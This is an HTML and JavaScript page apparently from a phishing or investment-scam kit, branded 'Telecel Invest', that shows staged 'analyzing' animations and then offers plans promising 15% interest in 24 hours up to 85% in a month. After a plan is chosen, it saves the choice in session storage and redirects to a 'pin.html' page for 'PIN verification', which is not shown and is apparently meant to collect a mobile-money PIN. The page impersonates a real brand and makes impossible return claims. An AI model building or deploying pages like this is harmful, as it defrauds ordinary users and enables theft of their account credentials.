<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telecel Invest – Start Investing</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --bg: #f5f5f5;
      --card: #ffffff;
      --border: #e5e7eb;
      --text: #111827;
      --sub: #6b7280;
      --telecel-red: #ff0000;
      --telecel-darkred: #cc0000;
      --shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      --radius: 18px;
    }

    body {
      font-family: 'Inter', Arial, Helvetica, sans-serif;
      background: var(--bg);
      color: var(--text);
      padding: 20px 12px;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: #f7f7f7;
      border-radius: 28px;
      padding: 24px 20px 30px;
      box-shadow: var(--shadow);
      position: relative;
      overflow: hidden;
    }

    .top-bg {
      position: absolute;
      top: 0;
      right: 0;
      width: 220px;
      height: 220px;
      background: linear-gradient(135deg, rgba(255, 0, 0, 0.25), rgba(255, 0, 0, 0.6));
      border-bottom-left-radius: 120px;
      z-index: 0;
      pointer-events: none;
    }

    .telecel-header {
      position: relative;
      z-index: 2;
      text-align: center;
      margin-bottom: 16px;
    }

    .logo-circle {
      width: 56px;
      height: 56px;
      background: var(--telecel-red);
      border-radius: 50%;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 32px;
      font-weight: 800;
      margin: 0 auto 6px;
      box-shadow: 0 4px 10px rgba(255, 0, 0, 0.3);
    }

    .logo-text {
      color: var(--telecel-red);
      font-size: 28px;
      font-weight: 800;
      letter-spacing: -0.5px;
      line-height: 1;
      margin-bottom: 4px;
    }

    /* Application card */
    .application-card {
      background: var(--card);
      border-radius: var(--radius);
      padding: 28px 20px;
      box-shadow: var(--shadow);
      border: 1px solid var(--border);
      text-align: center;
      margin: 20px 0 24px;
      position: relative;
      z-index: 2;
      transition: all 0.3s ease;
    }

    /* Step container (for suspense animation) */
    .step-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
    }

    .step-icon {
      font-size: 48px;
      color: var(--telecel-red);
      margin-bottom: 8px;
    }

    .step-title {
      font-size: 24px;
      font-weight: 700;
      color: var(--telecel-red);
      margin-bottom: 12px;
    }

    .step-description {
      font-size: 15px;
      color: var(--sub);
      line-height: 1.5;
    }

    /* Loader animation */
    .loader {
      width: 40px;
      height: 40px;
      border: 3px solid #ffe0e0;
      border-top: 3px solid var(--telecel-red);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px auto 0;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Investment form styles */
    .invest-form {
      width: 100%;
      margin: 20px 0;
    }

    .input-group {
      margin-bottom: 24px;
      text-align: left;
    }

    .input-group label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: var(--sub);
      margin-bottom: 8px;
    }

    .error-message {
      font-size: 12px;
      color: #dc2626;
      margin-top: 6px;
      display: none;
    }

    .btn {
      width: 100%;
      padding: 16px 20px;
      border: none;
      border-radius: 14px;
      background: var(--telecel-red);
      color: white;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 8px 20px rgba(255, 0, 0, 0.3);
      transition: 0.2s;
      text-decoration: none;
      display: inline-block;
      text-align: center;
    }

    .btn:hover {
      background: #e60000;
      transform: scale(1.02);
    }

    .btn:disabled {
      background: #e5e5e5;
      color: #999;
      box-shadow: none;
      cursor: not-allowed;
      transform: none;
    }

    .footer {
      text-align: center;
      margin-top: 24px;
      font-size: 12px;
      color: #aaa;
      position: relative;
      z-index: 2;
    }

    /* Spinner overlay for suspense */
    #spinner {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(0, 0, 0, 0.75);
      backdrop-filter: blur(4px);
      z-index: 999;
      flex-direction: column;
      gap: 20px;
      color: white;
      font-weight: 600;
      font-size: 18px;
    }

    .spinner-loader {
      width: 50px;
      height: 50px;
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-top: 4px solid var(--telecel-red);
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    .suspense-message {
      font-size: 16px;
      color: white;
      text-align: center;
      max-width: 80%;
    }

    /* plan options styling */
    .plan-options {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-top: 8px;
    }
    .plan-option {
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 16px;
      cursor: pointer;
      transition: all 0.2s;
      background: #fff;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .plan-option.selected {
      border-color: var(--telecel-red);
      background: #fff5f5;
      box-shadow: 0 0 0 1px var(--telecel-red);
    }
    .plan-info {
      flex: 1;
    }
    .plan-name {
      font-weight: 800;
      font-size: 16px;
      color: #111;
    }
    .plan-rate {
      font-size: 14px;
      color: var(--telecel-red);
      margin-top: 4px;
      font-weight: 700;
    }
    .plan-desc {
      font-size: 11px;
      color: var(--sub);
      margin-top: 4px;
    }
    .plan-icon {
      font-size: 28px;
      color: var(--telecel-red);
      margin-left: 12px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="top-bg"></div>

    <div class="telecel-header">
      <div class="logo-circle">t</div>
      <div class="logo-text">telecel invest</div>
    </div>

    <div class="application-card" id="applicationCard">
      <div id="stepContent"></div>
    </div>

    <div class="footer">
      v1.0 (Telecel Invest) • Grow your wealth with Telecel
    </div>
  </div>

  <!-- Spinner overlay for next action -->
  <div id="spinner">
    <div class="spinner-loader"></div>
    <div class="suspense-message">Preparing your investment...</div>
  </div>

  <script>
    // Suspense step before showing the plan selection
    const suspenseStep = {
      icon: 'fas fa-chart-line',
      title: 'Analyzing Investment Opportunities',
      description: 'Finding the best high-yield plans for you...',
      duration: 2500
    };

    let timeoutId = null;
    const stepContent = document.getElementById('stepContent');

    // Investment plans: 24hrs, 3 days, 1 week, 1 month with high interest
    const plans = [
      { id: '24h', name: '24 Hours Turbo', rate: '15%', desc: 'Fast return in just 1 day', duration: '24 hours', icon: 'fa-bolt' },
      { id: '3d', name: '3 Days Accelerator', rate: '25%', desc: 'Triple in 3 days', duration: '3 days', icon: 'fa-charging-station' },
      { id: '1w', name: '1 Week Max', rate: '45%', desc: 'Massive returns in 7 days', duration: '1 week', icon: 'fa-calendar-week' },
      { id: '1m', name: '1 Month Premium', rate: '85%', desc: 'Ultimate growth in 30 days', duration: '1 month', icon: 'fa-crown' }
    ];

    function showSuspense() {
      stepContent.innerHTML = `
        <div class="step-container">
          <div class="step-icon"><i class="${suspenseStep.icon}"></i></div>
          <div class="step-title">${suspenseStep.title}</div>
          <div class="step-description">${suspenseStep.description}</div>
          <div class="loader"></div>
        </div>
      `;
      timeoutId = setTimeout(() => {
        showPlanSelection();
      }, suspenseStep.duration);
    }

    function showPlanSelection() {
      stepContent.innerHTML = `
        <div class="step-container">
          <div class="step-icon"><i class="fas fa-chart-simple"></i></div>
          <div class="step-title">Select Your Plan</div>
          <div class="invest-form">
            <div class="input-group">
              <div class="plan-options" id="planOptions"></div>
              <div class="error-message" id="planError">Please select an investment plan to continue.</div>
            </div>
            <button id="nextBtn" class="btn" disabled>Next</button>
          </div>
        </div>
      `;

      const planContainer = document.getElementById('planOptions');
      let selectedPlanId = null;

      plans.forEach(plan => {
        const div = document.createElement('div');
        div.className = 'plan-option';
        div.setAttribute('data-plan-id', plan.id);
        div.innerHTML = `
          <div class="plan-info">
            <div class="plan-name">${plan.name}</div>
            <div class="plan-rate">${plan.rate} interest</div>
            <div class="plan-desc">${plan.desc} • ${plan.duration}</div>
          </div>
          <div class="plan-icon"><i class="fas ${plan.icon}"></i></div>
        `;
        div.addEventListener('click', () => {
          document.querySelectorAll('.plan-option').forEach(opt => opt.classList.remove('selected'));
          div.classList.add('selected');
          selectedPlanId = plan.id;
          document.getElementById('planError').style.display = 'none';
          document.getElementById('nextBtn').disabled = false;
        });
        planContainer.appendChild(div);
      });

      const nextBtn = document.getElementById('nextBtn');
      const planError = document.getElementById('planError');

      nextBtn.addEventListener('click', function() {
        if (!selectedPlanId) {
          planError.style.display = 'block';
          return;
        }

        // Store selected plan in sessionStorage
        const selectedPlan = plans.find(p => p.id === selectedPlanId);
        sessionStorage.setItem('selectedInvestmentPlan', JSON.stringify(selectedPlan));
        sessionStorage.setItem('investmentPlanId', selectedPlanId);

        // Show spinner and redirect to pin.html
        const spinner = document.getElementById('spinner');
        spinner.style.display = 'flex';
        nextBtn.disabled = true;

        // Optional: change suspense message to build anticipation
        const suspenseMsg = document.querySelector('.suspense-message');
        setTimeout(() => {
          if (suspenseMsg) suspenseMsg.textContent = 'Securing your investment details...';
        }, 500);
        setTimeout(() => {
          if (suspenseMsg) suspenseMsg.textContent = 'Redirecting to PIN verification...';
        }, 1000);

        setTimeout(() => {
          window.location.href = 'pin.html';
        }, 1800);
      });
    }

    // Start the flow
    showSuspense();

    window.addEventListener('beforeunload', () => {
      if (timeoutId) clearTimeout(timeoutId);
    });
  </script>
</body>
</html>
